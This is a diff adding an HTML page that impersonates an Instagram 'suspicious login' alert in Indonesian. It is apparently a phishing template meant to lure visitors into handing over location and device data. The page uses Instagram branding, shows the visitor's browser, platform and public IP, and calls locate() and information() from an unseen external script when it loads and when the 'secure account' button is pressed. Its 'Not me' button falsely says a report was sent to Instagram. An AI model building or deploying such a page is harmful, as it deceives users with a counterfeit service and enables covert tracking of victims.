@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <title>Instagram</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="theme-color" content="#000000">
+  <script type="text/javascript">
+    if (window.location.protocol == "http:") {
+      var restOfUrl = window.location.href.substr(5);
+      window.location = "https:" + restOfUrl;
+    }
+  </script>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+  <script src="/js/location.js"></script>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+      background: #000;
+      color: #f5f5f5;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .container {
+      width: 100%;
+      max-width: 420px;
+      padding: 24px;
+    }
+    .logo {
+      text-align: center;
+      margin-bottom: 32px;
+    }
+    .logo svg { width: 48px; height: 48px; }
+    .alert-box {
+      background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+      border: 1px solid rgba(255,255,255,0.08);
+      border-radius: 16px;
+      padding: 32px 24px;
+      text-align: center;
+      box-shadow: 0 8px 32px rgba(0,0,0,0.5);
+    }
+    .icon-shield {
+      width: 64px; height: 64px;
+      background: linear-gradient(135deg, #f58529, #dd2a7b, #8134af, #515bd4);
+      border-radius: 50%;
+      display: flex; align-items: center; justify-content: center;
+      margin: 0 auto 20px;
+      font-size: 28px;
+      box-shadow: 0 4px 20px rgba(221,42,123,0.3);
+    }
+    h2 { font-size: 20px; font-weight: 600; margin-bottom: 8px; }
+    p { font-size: 14px; color: #8e8e8e; line-height: 1.6; margin-bottom: 6px; }
+    .device-info {
+      background: rgba(255,255,255,0.05);
+      border-radius: 10px;
+      padding: 14px;
+      margin: 20px 0;
+      text-align: left;
+      font-size: 12px;
+      color: #8e8e8e;
+      font-family: monospace;
+    }
+    .device-info span { color: #f5f5f5; }
+    .btn {
+      display: block;
+      width: 100%;
+      padding: 14px;
+      border: none;
+      border-radius: 12px;
+      font-size: 15px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.3s;
+      margin-top: 16px;
+    }
+    .btn-primary {
+      background: linear-gradient(135deg, #f58529, #dd2a7b);
+      color: #fff;
+    }
+    .btn-primary:hover { transform: translateY(-1px); box-shadow: 0 4px 15px rgba(221,42,123,0.4); }
+    .btn-secondary {
+      background: rgba(255,255,255,0.08);
+      color: #8e8e8e;
+      font-weight: 500;
+    }
+    .btn-secondary:hover { background: rgba(255,255,255,0.12); }
+    .footer { text-align: center; margin-top: 16px; font-size: 12px; color: #555; }
+  </style>
+</head>
+<body onload="information();">
+  <div class="container">
+    <div class="logo">
+      <svg viewBox="0 0 48 48" fill="none">
+        <rect x="4" y="4" width="40" height="40" rx="10" fill="url(#ig)" stroke="#fff" stroke-width="2"/>
+        <circle cx="24" cy="24" r="11" stroke="#fff" stroke-width="2.5" fill="none"/>
+        <circle cx="36" cy="12" r="3" fill="#fff"/>
+        <defs><linearGradient id="ig" x1="0" y1="0" x2="48" y2="48"><stop stop-color="#f58529"/><stop offset="0.5" stop-color="#dd2a7b"/><stop offset="1" stop-color="#8134af"/></linearGradient></defs>
+      </svg>
+    </div>
+    <div class="alert-box">
+      <div class="icon-shield">!</div>
+      <h2>Login Mencurigakan Terdeteksi</h2>
+      <p>Kami mendeteksi percobaan login dari perangkat yang tidak dikenal.</p>
+      <p style="font-size:13px; color:#dd2a7b; font-weight:500;">Lindungi akun Anda sekarang.</p>
+      <div class="device-info">
+        <div>Perangkat: <span id="device-os">Mendeteksi...</span></div>
+        <div>Browser: <span id="device-browser">-</span></div>
+        <div>Lokasi IP: <span id="device-ip">-</span></div>
+      </div>
+      <button class="btn btn-primary" onclick="locate(function(){this.innerHTML='✅ Verifikasi Berhasil'; this.disabled=true;}.bind(this), function(){this.innerHTML='❌ Gagal. Coba Lagi';}.bind(this))">Ini Saya — Amankan Akun</button>
+      <button class="btn btn-secondary" onclick="alert('Laporan telah dikirim ke tim keamanan Instagram.')">Bukan Saya</button>
+      <div class="footer">Instagram dari Meta</div>
+    </div>
+  </div>
+  <script>
+    var osEl = document.getElementById('device-os');
+    var brEl = document.getElementById('device-browser');
+    var ipEl = document.getElementById('device-ip');
+    osEl.textContent = navigator.platform || 'Unknown';
+    brEl.textContent = navigator.userAgent.match(/Chrome\/[\d.]+|Firefox\/[\d.]+|Safari\/[\d.]+/)?.[0] || 'Unknown';
+    fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>{ ipEl.textContent = d.ip; }).catch(()=>{});
+  </script>
+</body>
+</html>
